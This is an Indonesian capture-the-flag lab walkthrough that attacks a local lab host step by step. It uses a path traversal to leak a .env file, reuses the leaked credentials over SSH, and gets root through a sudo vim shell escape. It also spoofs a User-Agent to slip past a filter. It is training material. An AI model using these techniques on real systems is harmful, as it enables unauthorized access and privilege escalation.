# 04 — Pembahasan Detail Lab Statute v2
## Recon → Path Traversal → .env → SSH Operator → sudo Vim → Root

> Target pembaca: peserta baru yang perlu memahami bagaimana file `.env` ditemukan dan mengapa `sudo vim` bisa menjadi root shell.

---

## 1. Gambaran Besar

Alur lengkap Statute:

```text
Recon port 22 dan 8080
→ directory enumeration menemukan endpoint download
→ pahami request normal /download?file=
→ buat baseline file valid dan file tidak ada
→ uji path traversal ../.env
→ .env berisi DB_USERNAME dan DB_PASSWORD
→ credential reuse ke SSH operator
→ sudo -l
→ operator boleh menjalankan vim sebagai root
→ sudo vim -c ':!/bin/sh'
→ root
→ find flag
```

---

## 2. Data Lab

| Item | Nilai |
|---|---|
| Target | `192.168.56.120` |
| Web | `http://192.168.56.120:8080` |
| SSH | `22` |
| Endpoint penting | `/download?file=` |
| File bocor | `../.env` |
| User SSH | `operator` |
| Password | dari `DB_PASSWORD` pada `.env` |
| Privesc | `sudo vim` |
| Cari flag | `find / -type f -iname "*flag*" 2>/dev/null` |

---

## 3. Fase 1 — Recon Service

### Command

```bash
TARGET="192.168.56.120"
WEB="http://192.168.56.120:8080"

nmap -Pn -sC -sV -p22,80,8080 "$TARGET"
```

### Output yang Diharapkan

```text
22/tcp   open ssh
8080/tcp open http
```

### Makna Output

SSH terbuka, tetapi kita belum punya credential. Credential akan dicari dari aplikasi web.

---

## 4. Fase 2 — Directory Enumeration

### Command

```bash
dirsearch \
  -u "$WEB" \
  -e php,html,txt,bak,env
```

### Output yang Diharapkan

```text
/download
/download.php
/documents
```

### Makna Output

Endpoint `/download` menunjukkan aplikasi mungkin mengambil file berdasarkan parameter. Ini kandidat path traversal.

---

## 5. Fase 3 — Pahami Request Download Normal

### Cara Manual

Buka aplikasi di browser, klik tombol download, lalu amati URL atau request melalui Burp/Developer Tools.

### Bentuk Request

```http
GET /download?file=uu-1-2024.pdf HTTP/1.1
Host: 192.168.56.120:8080
```

### Makna

Parameter yang dikontrol user adalah:

```text
file
```

Jika parameter ini tidak dibatasi, kita dapat mencoba `../`.

---

## 6. Fase 4 — Baseline File Valid dan Invalid

### File Valid

```bash
curl --path-as-is -i \
  "$WEB/download?file=uu-1-2024.pdf"
```

### Output

```text
HTTP/1.1 200 OK
Content-Type: application/pdf
```

### File Tidak Ada

```bash
curl --path-as-is -i \
  "$WEB/download?file=missing.pdf"
```

### Output

```text
HTTP/1.1 404 Not Found
```

### Mengapa Baseline Penting?

Agar peserta tahu perbedaan:
- respons file valid;
- respons file tidak ada;
- respons traversal berhasil.

Tanpa baseline, peserta mudah salah menafsirkan output.

---

## 7. Fase 5 — Uji Path Traversal ke `.env`

### Command

```bash
curl --path-as-is -i \
  -H 'User-Agent: Mozilla/5.0' \
  "$WEB/download?file=../.env"
```

### Output Evidence

```text
HTTP/1.1 200 OK
Content-Disposition: attachment; filename=".env"

DB_USERNAME=operator
DB_PASSWORD=<PASSWORD_DARI_ENV>
DB_DATABASE=jdih
```

### Makna Output

Aplikasi membaca file di luar folder dokumen. Ini membuktikan Path Traversal / Arbitrary File Read.

### Penjelasan Path

Jika aplikasi mengambil file dari folder `documents`, maka:

```text
documents/../.env
```

akan kembali ke root aplikasi dan membaca `.env`.

### Mengapa Pakai `--path-as-is`?

Agar curl tidak menormalisasi path yang mengandung `../`.

### Mengapa Pakai User-Agent?

Sebagian aplikasi memblokir request tool sederhana. User-Agent browser membantu menyamai request browser normal.

---

## 8. Fase 6 — Credential Reuse ke SSH

### Command

```bash
ssh operator@"$TARGET"
```

Password:

```text
<PASSWORD_DARI_ENV>
```

### Validasi

```bash
whoami
id
hostname
pwd
```

### Output Evidence

```text
operator
uid=1001(operator)
statute
/home/operator
```

### Makna Output

Kita berhasil masuk sebagai user sistem `operator`. Ini bukan brute force; credential berasal dari `.env`.

---

## 9. Fase 7 — Enumerasi Sudo

### Command

```bash
sudo -l
```

### Output Evidence

```text
(root) /usr/bin/vim
```

atau:

```text
(root) NOPASSWD: /usr/bin/vim
```

### Makna Output

User `operator` dapat menjalankan Vim sebagai root. Karena Vim dapat menjalankan shell command, ini menjadi privilege escalation.

---

## 10. Fase 8 — Root via Vim Shell Escape

### Cara Cepat

```bash
sudo vim -c ':!/bin/sh'
```

### Output Evidence

Di shell yang muncul:

```bash
whoami
id
```

Expected:

```text
root
uid=0(root) gid=0(root)
```

### Penjelasan

`-c` menyuruh Vim menjalankan command internal saat start.

Command internal:

```vim
:!/bin/sh
```

artinya jalankan `/bin/sh` dari dalam Vim. Karena Vim berjalan sebagai root, shell juga root.

---

## 11. Fase 9 — Cara Interaktif Alternatif

Jika command cepat kurang nyaman:

```bash
sudo vim
```

Di dalam Vim:

```vim
:!/bin/bash
```

Keluar dari shell:

```bash
exit
```

Keluar dari Vim:

```vim
:q!
```

---

## 12. Fase 10 — Cari dan Baca Flag

### Cari Flag

```bash
find / -type f -iname "*flag*" 2>/dev/null
```

### Output Contoh

```text
/root/flag.txt
```

### Baca Flag

```bash
cat /PATH/FLAG
```

---

## 13. Kesalahan Umum Statute

| Masalah | Penyebab | Solusi |
|---|---|---|
| Tidak tahu parameter traversal | Tidak melihat request download normal | Gunakan browser/Burp/DevTools |
| `.env` 404 | Kedalaman path kurang | Coba `../../.env` terbatas |
| `.env` 403 | Filter User-Agent | Tambahkan header Mozilla |
| SSH gagal | Salah salin password dari `.env` | Salin persis DB_PASSWORD |
| `sudo vim` tidak langsung shell | Mode Vim tidak cocok | Gunakan cara interaktif |

---

## 14. Alur Hafalan Statute

```text
nmap 22,8080
dirsearch → /download
lihat request → file=
baseline 200 dan 404
curl ../.env
DB_USERNAME operator
DB_PASSWORD
ssh operator
sudo -l
(root) /usr/bin/vim
sudo vim -c ':!/bin/sh'
root
find flag
cat flag
```
